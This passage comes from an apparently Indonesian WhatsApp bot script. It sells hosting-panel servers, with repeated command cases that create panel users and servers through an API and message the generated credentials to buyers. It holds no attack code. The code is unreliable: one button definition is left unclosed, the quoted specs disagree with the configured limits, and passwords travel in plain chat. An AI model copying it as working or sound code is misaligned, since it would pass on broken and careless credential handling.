let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 11075
│ • DISK : 11075
│ • CPU : 330%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 11075
│ • *DISK :* 11075
│ • *CPU :* 330%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break

case "12gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "12075"
let cpu = "240"
let disk = "12075"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 11075
│ • DISK : 11075
│ • CPU : 360%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 12075
│ • *DISK :* 12075
│ • *CPU :* 360%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break

case "13gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "13075"
let cpu = "390"
let disk = "13075"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 11075
│ • DISK : 11075
│ • CPU : 390%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 13075
│ • *DISK :* 13075
│ • *CPU :* 390%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break

case "14gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "14075"
let cpu = "420"
let disk = "14075"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 14075
│ • DISK : 14075
│ • CPU : 420%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 14075
│ • *DISK :* 14075
│ • *CPU :* 420%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break

case "15gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "15075"
let cpu = "450"
let disk = "15075"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 15075
│ • DISK : 15075
│ • CPU : 450%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 15075
│ • *DISK :* 15075
│ • *CPU :* 450%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break

case "16gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "16075"
let cpu = "480"
let disk = "16075"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 16075
│ • DISK : 16075
│ • CPU : 480%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 16075
│ • *DISK :* 16075
│ • *CPU :* 480%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break

case "17gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "17075"
let cpu = "510"
let disk = "17075"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 17075
│ • DISK : 17075
│ • CPU : 510%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
